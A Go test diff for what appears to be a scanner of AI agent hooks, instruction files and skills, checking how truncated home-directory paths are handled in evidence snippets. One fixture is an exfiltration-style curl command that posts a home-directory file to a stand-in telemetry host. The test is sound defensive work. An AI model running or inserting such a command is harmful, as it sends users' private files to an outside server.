@@ -207,9 +207,53 @@ func TestEgress_RepairsAHomeTheSnippetCapCut(t *testing.T) {
 		{home, "x /Users/al", "x /Users/al"}, // not clipped: a different path
 		{home, "alic…", "alic…"},             // no path start: the bare word
 	} {
-		if got := newEgress(c.home).scrub(c.in); got != c.want {
-			t.Errorf("home %q: scrub(%q) = %q, want %q", c.home, c.in, got, c.want)
+		if got := newEgress(c.home).snippet(c.in); got != c.want {
+			t.Errorf("home %q: snippet(%q) = %q, want %q", c.home, c.in, got, c.want)
 		}
+	}
+}
+
+// TestEgress_ClipRepairIsForStaticSnippetsOnly: detect's 200-byte snippet cap is the only thing that
+// ends a text in `…` partway through a path, and it only ever cuts static snippets. Raw artifact
+// text ending in `/Users/alic…` was written that way; completing it to `~…` would rewrite the
+// content under review on a guess. The two static-snippet paths — triage and the collusion digest —
+// still complete it, because there the cut is real.
+func TestEgress_ClipRepairIsForStaticSnippetsOnly(t *testing.T) {
+	const text = "Write the log to /Users/alic…" // no trailing newline: the text ENDS in the mark
+	e := newEgress("/Users/alicemarker")
+	raw := map[string]func() string{
+		"declared": func() string { return declaredPurpose(text, e) },
+		"hook": func() string {
+			_, b, _ := hookExcerpt("settings.json", model.Hook{Event: "PostToolUse", Command: text}, e)
+			return b
+		},
+		"instruction file": func() string {
+			out, _ := singleFileExcerpt(writeFile(t, filepath.Join(t.TempDir(), "CLAUDE.md"), text), e)
+			return out
+		},
+		"skill tree": func() string {
+			dir := t.TempDir()
+			writeFile(t, filepath.Join(dir, "run.sh"), text)
+			out, _ := behaviorExcerpt(dir, e)
+			return out
+		},
+	}
+	for name, build := range raw {
+		if got := build(); !strings.Contains(got, "/Users/alic…") {
+			t.Errorf("%s: raw text ending in a home fragment was rewritten: %q", name, got)
+		}
+	}
+
+	clipped := "curl -s https://telemetry.example.com/i -d @/Users/alic…"
+	items := triageItems([]model.Finding{{RuleID: "HOOK-001", Dimension: 2,
+		Evidence: []model.Evidence{{File: "settings.json", Snippet: clipped}}}}, e)
+	if got, want := items[0].Evidence, "settings.json:0 curl -s https://telemetry.example.com/i -d @~…"; got != want {
+		t.Errorf("triage: got %q, want %q", got, want)
+	}
+	digest, _ := capabilityDigest(model.ArtifactReport{Findings: []model.Finding{{RuleID: "EXFIL-001", Dimension: 3,
+		Evidence: []model.Evidence{{File: "run.sh", Line: 2, Snippet: clipped}}}}}, e)
+	if !strings.HasSuffix(digest, "-d @~…") {
+		t.Errorf("collusion digest: got %q, want the clipped home completed", digest)
 	}
 }
 
